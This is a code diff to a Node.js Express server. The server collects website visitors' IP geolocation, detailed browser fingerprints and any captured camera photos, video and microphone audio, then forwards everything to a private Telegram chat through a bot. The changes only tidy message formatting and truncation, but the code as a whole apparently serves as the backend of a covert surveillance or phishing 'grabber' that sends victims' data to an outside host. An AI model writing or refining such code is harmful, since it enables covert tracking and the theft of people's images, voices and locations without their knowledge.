@@ -1,9 +1,6 @@
 const express = require('express');
 const cors = require('cors');
 
-// ================================================================
-// READ TELEGRAM CREDENTIALS FROM ENVIRONMENT VARIABLES
-// ================================================================
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
@@ -18,77 +15,66 @@ app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 
 // ================================================================
-// BUILD A CLEAN SUMMARY – NO BASE64 DATA, NO LARGE STRINGS
+// BUILD A COMPACT, PLAIN-TEXT SUMMARY – NO MARKDOWN, NO LARGE FIELDS
 // ================================================================
 function buildMessage(ipData, fingerprint) {
-    let msg = '📡 *New Visitor Info*\n\n';
+    let msg = '📡 New Visitor Info\n\n';
 
-    // --- IP info ---
+    // IP Info (essential only)
     if (ipData) {
-        msg += '*IP Info:*\n';
-        msg += `IP: ${ipData.ip || 'N/A'}\n`;
-        if (ipData.city) msg += `City: ${ipData.city}\n`;
-        if (ipData.region) msg += `Region: ${ipData.region}\n`;
-        if (ipData.country_name) msg += `Country: ${ipData.country_name}\n`;
-        if (ipData.country_code) msg += `Country Code: ${ipData.country_code}\n`;
-        if (ipData.postal) msg += `Postal: ${ipData.postal}\n`;
-        if (ipData.latitude && ipData.longitude) {
-            msg += `Location: ${ipData.latitude}, ${ipData.longitude}\n`;
-            msg += `Maps: https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}\n`;
-        }
-        if (ipData.org) msg += `ISP: ${ipData.org}\n`;
-        if (ipData.timezone) msg += `Timezone: ${ipData.timezone}\n`;
+        msg += 'IP: ' + (ipData.ip || 'N/A') + '\n';
+        if (ipData.city) msg += 'City: ' + ipData.city + '\n';
+        if (ipData.region) msg += 'Region: ' + ipData.region + '\n';
+        if (ipData.country_name) msg += 'Country: ' + ipData.country_name + '\n';
+        if (ipData.org) msg += 'ISP: ' + ipData.org + '\n';
         msg += '\n';
     }
 
-    // --- Device & Browser ---
+    // Device & Browser (truncated)
     if (fingerprint) {
-        msg += '*Device & Browser:*\n';
-
-        // Limit User‑Agent to 120 characters to avoid bloat
-        const ua = (fingerprint.userAgent || '').substring(0, 120);
-        msg += `User Agent: ${ua}\n`;
-
-        msg += `Platform: ${fingerprint.platform || 'N/A'}\n`;
-        msg += `Language: ${fingerprint.language || 'N/A'}\n`;
+        msg += 'Device & Browser:\n';
+        // User agent truncated to 60 chars
+        const ua = (fingerprint.userAgent || '').substring(0, 60);
+        msg += 'User Agent: ' + ua + '\n';
+        msg += 'Platform: ' + (fingerprint.platform || 'N/A') + '\n';
+        msg += 'Language: ' + (fingerprint.language || 'N/A') + '\n';
         if (fingerprint.screen) {
-            msg += `Screen: ${fingerprint.screen.width}x${fingerprint.screen.height} `;
-            msg += `(${fingerprint.screen.colorDepth}bit, ratio ${fingerprint.screen.pixelRatio})\n`;
+            msg += 'Screen: ' + fingerprint.screen.width + 'x' + fingerprint.screen.height +
+                   ' (' + fingerprint.screen.colorDepth + 'bit, ratio ' + fingerprint.screen.pixelRatio + ')\n';
         }
-        msg += `Touch Points: ${fingerprint.maxTouchPoints}\n`;
-        msg += `Cores: ${fingerprint.hardwareConcurrency}\n`;
-        msg += `Memory: ${fingerprint.deviceMemory} GB\n`;
-        msg += `Timezone: ${fingerprint.timezone}\n`;
-
-        // WebGL – short
+        msg += 'Touch Points: ' + fingerprint.maxTouchPoints + '\n';
+        msg += 'Cores: ' + fingerprint.hardwareConcurrency + '\n';
+        msg += 'Memory: ' + fingerprint.deviceMemory + ' GB\n';
+        msg += 'Timezone: ' + fingerprint.timezone + '\n';
+        // GPU (truncated to 50 chars)
         if (fingerprint.webgl && fingerprint.webgl !== 'not supported' && fingerprint.webgl !== 'unsupported') {
-            const gpu = (fingerprint.webgl.renderer || '').substring(0, 80);
-            msg += `GPU: ${gpu}\n`;
+            const gpu = (fingerprint.webgl.renderer || '').substring(0, 50);
+            msg += 'GPU: ' + gpu + '\n';
         }
-
-        // Canvas – only a yes/no indicator (no data URL)
-        if (fingerprint.canvas) {
-            msg += `Canvas fingerprint: captured\n`;
-        }
-
         msg += '\n';
     }
 
-    msg += `*Timestamp:* ${new Date().toISOString()}`;
+    msg += 'Timestamp: ' + new Date().toISOString();
 
-    // Log the length for debugging
-    console.log(`[DEBUG] Message length: ${msg.length} characters`);
-
-    // Hard cut at 3900 characters (Telegram max is 4096)
-    if (msg.length > 3900) {
-        msg = msg.substring(0, 3897) + '...';
+    // Brutal byte-length truncation (Telegram max = 4096 bytes, we use 3800)
+    const maxBytes = 3800;
+    let buf = Buffer.from(msg, 'utf8');
+    if (buf.length > maxBytes) {
+        // Slice to maxBytes, then decode safely (may cut a multi-byte char)
+        buf = buf.slice(0, maxBytes);
+        // Remove the last incomplete character by truncating to a valid UTF-8 boundary
+        let safeString = buf.toString('utf8');
+        // If the last byte started a multi-byte sequence, it will be replaced by a replacement character.
+        // To be absolutely safe, we slice off the last 3 characters to avoid garbled ending.
+        safeString = safeString.substring(0, safeString.length - 3);
+        msg = safeString + '...';
     }
 
     return msg;
 }
 
 // ================================================================
-// TELEGRAM SENDING HELPERS
+// TELEGRAM SENDERS
 // ================================================================
 async function sendTextMessage(text) {
     try {
@@ -99,7 +85,7 @@ async function sendTextMessage(text) {
             body: JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
                 text,
-                parse_mode: 'Markdown'
+                // NO parse_mode – plain text avoids any formatting issues
             })
         });
 
@@ -173,11 +159,11 @@ app.post('/api/telegram', async (req, res) => {
         console.log(`[+] Video: ${video ? 'yes' : 'no'}`);
         console.log(`[+] Mic: ${mic ? 'yes' : 'no'}`);
 
-        // 1. Always send the clean text summary
+        // 1. Always send compact text
         const message = buildMessage(ipData, fingerprint);
         await sendTextMessage(message);
 
-        // 2. Media only if present
+        // 2. Media
         if (photo) await sendPhoto(photo);
         if (video) await sendVideo(video);
         if (mic) await sendAudio(mic);
